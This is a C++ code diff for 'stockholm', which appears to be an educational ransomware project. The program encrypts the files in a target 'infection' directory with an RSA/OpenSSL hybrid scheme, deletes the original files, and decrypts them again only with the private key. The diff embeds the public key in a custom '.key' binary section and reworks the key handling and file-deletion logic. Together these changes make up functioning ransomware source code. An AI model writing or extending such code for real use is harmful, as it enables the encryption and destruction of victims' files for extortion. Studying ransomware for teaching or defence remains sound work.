@@ -11,6 +11,9 @@
 #include "opts.hpp"
 #include "crawler.hpp"
 #include "stockholm.hpp"
+#include "ossl.hpp"
+
+[[gnu::section(".key")]] const unsigned char keyData[4096] = {0};
 
 namespace
 {
@@ -98,7 +101,7 @@ namespace
 		}
 		else
 		{
-			Log(std::string("Decrypted file ") + file.string());
+			Log(std::string("Encrypted file ") + file.string());
 
 			if (unlink(file.c_str()) < 0)
 			{
@@ -114,14 +117,19 @@ namespace
 	int decryptFile(fs::path keyfile, fs::path file, bool removeExtension)
 	{
 		Log(std::string("Decrypting file ") + file.string());
+		std::string encryptedFile = file.string();
 		BIO *in = BIO_new_file(file.c_str(), "rb");
 		if (!in)
 		{
 			LogOpenSSLError();
 			return 0;
 		}
+
 		if (removeExtension)
 			file.replace_extension("");
+		else
+			file.replace_extension(".unlock");
+		printf("%s\n", file.c_str());
 		BIO *out = BIO_new_file(file.c_str(), "wb");
 		if (!out)
 		{
@@ -137,7 +145,15 @@ namespace
 			ret = 0;
 		}
 		else
+		{
 			Log(std::string("Decrypted file ") + file.string());
+
+			if (unlink(encryptedFile.c_str()) < 0)
+			{
+				Perror("unlink");
+				ret = 0;
+			}
+		}
 		BIO_free(in);
 		BIO_free(out);
 		return (ret);
@@ -148,12 +164,15 @@ namespace
 		return decryptFile(keyfile, file, true);
 	}
 
-	int lockFilesInTarget(const fs::path &publicPEMFilePath)
+	int lockFilesInTarget()
 	{
+		EVP_PKEY *pkey = NewPublicKey(keyData);
+		if (!pkey)
+			return (0);
 		const fs::path &target = stockholm::options.GetInfectionDir();
 		fs::path publicKeyPath = target / stockholm::localPublicKeyFileName;
 		fs::path encryptedPrivateKeyPath = target / stockholm::localPrivateKeyFileName;
-		if (!CreateLocalRSAIdentity(publicPEMFilePath, publicKeyPath, encryptedPrivateKeyPath))
+		if (!CreateLocalRSAIdentity(pkey, publicKeyPath, encryptedPrivateKeyPath))
 			return 0;
 
 		Log(std::format("Searching for files in {}", target.string()));
@@ -174,14 +193,15 @@ namespace
 	int unlockFilesInTarget(const fs::path &privatePEMFilePath)
 	{
 		const fs::path &target = stockholm::options.GetInfectionDir();
-		fs::path encryptedPrivateKeyPath = target / stockholm::localPrivateKeyFileName;
-		decryptFile(privatePEMFilePath, encryptedPrivateKeyPath, false);
+		fs::path localPrivateKeyPath = target / stockholm::localPrivateKeyFileName;
+		decryptFile(privatePEMFilePath, localPrivateKeyPath, false);
+		localPrivateKeyPath.replace_extension(".unlock");
 		std::list<std::string> files = RetrieveFilesFrom(target);
 		std::list<std::string> filteredFiles;
 		std::copy_if(files.begin(), files.end(), std::back_inserter(filteredFiles), dotFtFilesFilter);
 		for (auto file : filteredFiles)
 		{
-			unlockFile(encryptedPrivateKeyPath, file);
+			unlockFile(localPrivateKeyPath, file);
 		}
 		return (1);
 	}
@@ -210,7 +230,7 @@ int main(int argc, char **argv)
 	if (stockholm::options.IsInDecryptionMode())
 		ret = unlockFilesInTarget(stockholm::options.GetKeyfilePath());
 	else
-		ret = lockFilesInTarget(fs::current_path() / "public.pem"); //! TODO: add introspection to retrieve the file
+		ret = lockFilesInTarget(); //! TODO: add introspection to retrieve the file
 	if (!ret)
 		Error("Failure");
 	return (!ret);
